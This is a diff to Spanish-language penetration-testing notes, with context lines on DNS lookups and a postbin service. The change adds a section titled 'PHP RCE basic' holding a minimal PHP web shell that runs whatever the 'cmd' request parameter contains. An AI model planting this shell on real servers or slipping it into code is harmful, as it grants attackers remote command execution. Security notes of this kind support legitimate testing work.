@@ -527,7 +527,13 @@ Permite hacer dnslookup para por ejemplo ver si hay una ejecucion de comandos.
 
 > https://www.toptal.com/developers/postbin/
 
+## PHP RCE basic
 
+```
+<?php 
+ echo "<pre>". shell_exec($_REQUEST['cmd']) . "</pre>";
+ ?>
+```
 
 ## Bibliografias 
 
